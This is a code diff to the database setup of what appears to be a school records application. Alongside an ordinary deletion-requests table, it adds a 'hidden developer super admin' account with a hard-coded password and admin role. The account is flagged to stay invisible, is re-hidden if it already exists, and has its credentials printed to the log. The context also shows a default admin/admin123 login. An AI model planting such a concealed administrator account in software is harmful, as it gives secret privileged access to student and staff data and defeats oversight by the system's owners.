@@ -312,6 +312,10 @@ const initSchema = () => {
             db.prepare("ALTER TABLE users ADD COLUMN is_active INTEGER DEFAULT 1").run();
             console.log('Migration: added is_active column to users table');
         }
+        if (!userCols.some(c => c.name === 'is_hidden')) {
+            db.prepare("ALTER TABLE users ADD COLUMN is_hidden INTEGER DEFAULT 0").run();
+            console.log('Migration: added is_hidden column to users table');
+        }
 
         // 2. AcademicYears Table
         db.prepare(`
@@ -742,6 +746,18 @@ const initSchema = () => {
             )
         `).run();
 
+        // 10d. Account Deletion Requests Table
+        db.prepare(`
+            CREATE TABLE IF NOT EXISTS account_deletion_requests (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                token TEXT UNIQUE NOT NULL,
+                expires_at DATETIME NOT NULL,
+                created_at DATETIME DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ', 'now')),
+                FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
+            )
+        `).run();
+
         // 11. System Settings Table
         db.prepare(`
             CREATE TABLE IF NOT EXISTS system_settings (
@@ -764,6 +780,19 @@ const initSchema = () => {
                 VALUES ('admin', ?, 'System', 'Developer', 'admin')
             `).run(hashedPassword);
             console.log('Default Admin created: admin / admin123');
+        }
+
+        // Seed Hidden Developer Super Admin if not exists
+        const devAdminUser = db.prepare("SELECT * FROM users WHERE username = 'developer'").get();
+        if (!devAdminUser) {
+            const hashedDevPassword = bcrypt.hashSync('Developer@2026!', 10);
+            db.prepare(`
+                INSERT INTO users (username, password, first_name, last_name, role, email, is_hidden)
+                VALUES ('developer', ?, 'Developer', 'Super Admin', 'admin', 'dev@tis.edu.ph', 1)
+            `).run(hashedDevPassword);
+            console.log('Hidden Developer Super Admin created: developer / Developer@2026!');
+        } else if (devAdminUser.is_hidden !== 1) {
+            db.prepare("UPDATE users SET is_hidden = 1 WHERE username = 'developer'").run();
         }
 
         // Seed default document requirements if none exist
